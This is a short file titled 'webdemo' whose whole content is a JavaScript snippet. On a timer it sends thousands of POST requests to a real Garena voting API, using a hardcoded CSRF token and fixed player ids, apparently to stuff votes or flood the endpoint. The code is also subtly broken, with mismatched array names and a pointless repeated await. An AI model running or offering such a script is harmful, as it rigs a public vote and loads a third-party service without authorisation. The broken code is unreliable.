# webdemo
setInterval(async function(){let promList=[];for(let i = 0; i < 8000;i++){ let prom = fetch('https://binhchon.lienminh.garena.vn/api/vote/create', {method: "POST", headers: { 'X-CSRFToken':  'aZ5fRPch1OJjdHPf26oMFeS69YVh02CbNmMJaj4VcBsgpr0TYStnZE1AwrxCuQbL',
  'Content-Type': 'application/json',
  'token' : undefined}, body: JSON.stringify({player_ids: [18, 22]})});listProm.push(prom)}for(let i =0; i < 12000;i++){await Promise.all(prom)}}, 15000)
